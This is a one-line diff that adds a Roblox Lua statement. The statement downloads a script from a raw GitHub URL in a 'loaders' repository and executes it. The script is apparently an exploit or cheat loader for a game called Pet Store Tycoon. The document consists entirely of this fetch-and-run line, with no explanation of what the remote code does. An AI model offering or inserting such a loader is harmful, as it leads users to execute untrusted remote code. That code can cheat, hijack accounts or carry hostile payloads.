@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/pet-store-tycoon-spam5-8ueptp2yfynp3n.lua"))()
